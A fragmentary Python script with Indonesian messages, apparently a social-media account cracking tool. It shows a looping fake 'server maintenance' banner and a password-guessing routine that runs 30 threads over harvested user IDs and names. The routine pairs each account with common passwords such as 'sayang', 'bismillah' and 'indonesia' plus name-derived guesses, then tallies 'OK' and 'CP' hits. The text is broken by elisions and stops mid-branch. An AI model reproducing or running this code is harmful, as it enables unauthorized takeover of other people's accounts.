...
def kata_buat_server():
	for nnn in list([C+"😭"+K+"•••"+Q, K+"•"+C+"😡"+K+"••"+Q, K+"••"+C+"😭"+K+"•"+Q, K+"•••"+C+"😡"+Q]):
		for nnnn in list(["Maaf Server Sedang, Maintenance", "Harap tunggu beberapa hari", "Lapor admin untuk server segera di per baikan"]):
			sys.stdout.write(f'\r {nnn} -> {M}{nnnn}{Q}        '),
			sys.stdout.flush()
			time.sleep(1)
	kata_buat_server()
...
if "OF" in von:pass
	...
	print(f'{P}[•] {M}Tekan CTRL + Z Untuk Ezit !')
	kata_buat_server()	
...
#Data Baca
sys.stdout.write('\x1b[1;35m\x1b]2; ☆ 𝘑𝘌𝘌𝘊𝘒 𝘟 𝘕𝘈𝘕𝘖 ☆ \x07')
# CLEAR
def clear():
	os.system('clear')
# BACK
...
def passwrd():
	...
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] {M}Harap lapor jika tools tidak memunculkan hasil ")
	print(f"{P}[•] Results {I}OK {P}: {I}{okc}")
	print(f"{P}[•] Results {K}CP {P}: {K}{cpc}")
	print(f"{P}[•] Mainkan mode pesawat 5 detik saat crack tidak muncul-muncul \n\n")
	with tred(max_workers=30) as pool:
		for crackkkk in id2:
			idf,nmf = crackkkk.split('|')[0],crackkkk.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayang','anjing','kontol','bismillah','katasandi','rahasia','indonesia','freefire']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
